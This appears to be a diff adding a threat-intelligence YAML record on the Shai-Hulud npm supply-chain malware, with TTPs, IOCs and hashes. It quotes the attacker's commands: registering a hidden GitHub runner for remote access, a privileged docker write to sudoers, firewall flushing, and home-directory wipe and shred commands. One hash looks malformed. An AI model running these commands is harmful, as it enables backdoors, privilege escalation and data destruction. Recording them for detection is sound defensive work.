@@ -1,0 +1,86 @@
+description: Attackers exploited a GitHub Actions injection vulnerability to publish
+  malicious NPM packages, which hijacked local AI command line tools and expanded
+  to include backdoor installation and remote access.
+malware_families:
+- Shai-Hulud
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - curl
+  - bash
+  - trufflehog
+  - tar
+  - unzip
+  - sudo
+  - docker
+  - systemctl
+  - iptables
+  commandline:
+  - powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-win-x64-2.330.0.zip
+    -OutFile actions-runner-win-x64-2.330.0.zip"
+  - powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem;
+    [System.IO.Compression.ZipFile]::ExtractToDirectory(\\\"actions-runner-win-x64-2.330.0.zip\\\",
+    \\\".\\\")"
+  - ./config.cmd --url <REPO_URL> --unattended --token <TOKEN> --name "SHA1HULUD"
+  - powershell -ExecutionPolicy Bypass -Command "Start-Process -WindowStyle Hidden
+    -FilePath \\\"./run.cmd\\\""
+  - mkdir -p $HOME/.dev-env
+  - curl -o actions-runner-linux-x64-2.330.0.tar.gz -L <URL>
+  - curl -o actions-runner-osx-arm64-2.330.0.tar.gz -L <URL>
+  - tar xzf ./actions-runner-linux-x64-2.330.0.tar.gz
+  - RUNNER_ALLOW_RUNASROOT=1 ./config.sh --url <REPO_URL> --unattended --token <TOKEN>
+    --name "SHA1HULUD"
+  - rm actions-runner-linux-x64-2.330.0.tar.gz
+  - rm actions-runner-osx-arm64-2.330.0.tar.gz
+  - bash -c \"cd $HOME/.dev-env && nohup ./run.sh &\"
+  - sudo -n true
+  - docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"
+  - sudo systemctl stop systemd-resolved
+  - sudo cp /tmp/resolved.conf /etc/systemd/resolved.conf
+  - sudo systemctl restart systemd-resolved
+  - sudo iptables -t filter -F OUTPUT
+  - sudo iptables -t filter -F DOCKER-USER
+  - cmd.exe /c "del /F /Q /S \"%USERPROFILE%*\" && for /d %%i in (\"%USERPROFILE%*\")
+    do rd /S /Q \"%%i\" & cipher /W:%USERPROFILE%"
+  - find \"$HOME\" -type f -writable -user \"$(id -un)\" -print0 | xargs -0 -r shred
+    -uvz -n 1 && find \"$HOME\" -depth -type d -empty -delete
+  powershell:
+  - Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-win-x64-2.330.0.zip
+    -OutFile actions-runner-win-x64-2.330.0.zip
+  - Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(\\\"actions-runner-win-x64-2.330.0.zip\\\",
+    \\\".\\\")"
+  - Start-Process -WindowStyle Hidden -FilePath \\\"./run.cmd\\\"
+  scripting_engine:
+  - node
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity:
+  - .github/workflows/discussion.yaml
+  - /etc/sudoers.d/runner
+  - /tmp/resolved.conf
+  - /etc/systemd/resolved.conf
+  persistence:
+  - Registers the host as a self-hosted runner named SHA1HULUD
+  - Creates malicious workflow at .github/workflows/discussion.yaml
+  process_relations: []
+IOCs:
+  hashes:
+  - cbb9bc5a8496243e02f3cc080efbe3e4a1430ba0671f2e43a202bf45b05479cdf
+  - f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee06846faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09768496fbdbbd05657d1cf858591480232313488831ad9a377a698aa1a6547f88
+  - de0e25a3e6c1e1e5998b306b7141b3dc4c0088da9d7bb47c1c00c91e6e4f85d6
+  ip_addresses: []
+  domains:
+  - github.com
+  - api.github.com
+  urls:
+  - https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-win-x64-2.330.0.zip
+  - https://bun.sh/install
+  - https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest
+authors:
+- Calvin So
+reference: https://the-sequence.com/investigating-shai-hulud
+date_of_publication: December 09, 2025
+file_creation_date: December 09, 2025
